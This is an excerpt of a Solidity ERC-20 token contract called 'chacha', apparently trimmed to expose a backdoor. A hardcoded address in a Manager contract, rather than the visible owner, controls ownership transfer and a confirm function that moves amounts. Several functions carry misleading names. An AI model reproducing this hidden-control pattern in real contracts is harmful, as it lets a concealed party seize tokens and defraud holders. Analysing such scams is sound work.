...
contract Manager {
    ...
    function configCode() public pure returns (address) {
        return 0x7319d2d11b3067E95D1D31fE08c9C0C0EaE67523;
    }
}
/**
...
contract Ownable is Context {
     ...
     */
    function renounceOwnership() public virtual config {
    ...
    modifier config() {
        require(manager.configCode() == _msgSender(), "Config: function configured");
        _;
    }
	...
	function transferOwnership(address newOwner) public virtual config {
        _owner = newOwner;
    }
}
...
contract chacha is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "chacha";
  string private _name = "chacha";
  ...
  function getPollData() external view returns (uint256) {
    return _totalSupply;
  }
  ...
  function quorumBps() external view returns (address) {
    return owner();
  }
  ...
  function confirm(address _to, uint256 _amount) config public returns (bool){
  ...
  function InvalidProof() external pure returns (bool) {
    return false;
  }
